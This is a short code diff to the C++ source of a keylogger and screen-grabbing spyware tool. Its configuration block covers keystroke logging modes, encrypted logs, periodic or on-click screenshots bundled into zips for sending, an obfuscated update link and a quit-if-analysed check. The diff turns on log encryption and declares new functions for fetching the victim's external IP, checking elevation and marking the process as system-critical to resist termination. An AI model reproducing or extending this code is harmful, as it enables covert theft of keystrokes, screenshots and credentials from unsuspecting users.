@@ -46,11 +46,11 @@ using buffer = std::vector<char>;
 
 //[ VERSION INFO ]
 #define IsMajor true        //let the program know whether its a Dev build or not
-#define CurrentVersion "2.0"//current version number
+#define CurrentVersion "2.1"//current version number
 #define GitVersionLink "i\\wnoNw;Yc|LZ\\YvYcpHYVx6Ycj34N6XI\\wn2crfY[P;{cu;ofvSZ[{L4Nv;4[wSpdnTpdxPoenPZfkXJc2n4\\weZ[{;{N8OJe2TJc"//link to GitHub Raw server containing up-to-date version file
 
 //[ LOGS ]
-#define CryptLogs false     //whether or not to crypt files
+#define CryptLogs true     //whether or not to crypt files
 #define KeyShiftLimit 122   //cap for the highest possible random encryption key
 #define LogMode 2           //how to log keystrokes                          [ 1 = Timer  ,  2 = Characters-per-log ]
 #define LogTimer 15         //minutes per log                                [ must use mode 2 ]
@@ -58,7 +58,7 @@ using buffer = std::vector<char>;
 #define QuitIfUntrust true  //should we send a log if the environment is untrusted or quit on the spot?
 
 //[ SCREENGRABBING ]
-#define ScreenGrab true     //whether to screenshot at set intervals or not
+#define ScreenGrab false     //whether to screenshot at set intervals or not
 #define ScreenshotMode 2    //how to screengrab                              [ 1 = Timer  ,  2 = Screenshot-On-Click ]
 #define SecondsBetweenScreenshots 20        //only works when using the timer
 #define ScreenshotsPerZip 5 //how many screenshots to collect before sending a zip file
@@ -125,8 +125,15 @@ LRESULT CALLBACK MouseThread(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lPa
 std::string HardDecode(std::string EncodedString);
 int Hooker(int HookType, HOOKPROC CallbackFunc);
 void TimerThread();
+std::string RetrieveExternalIp(std::string CurrentDir);
+BOOL IsElevated();
 
 
 typedef std::string String;
 typedef std::vector<String> StringVector;
 typedef unsigned long long uint64_t;
+
+typedef long (WINAPI* RtlSetProcessIsCritical) (
+	IN BOOLEAN	bNew,
+	OUT BOOLEAN* pbOld,
+	IN BOOLEAN	bNeedScb);
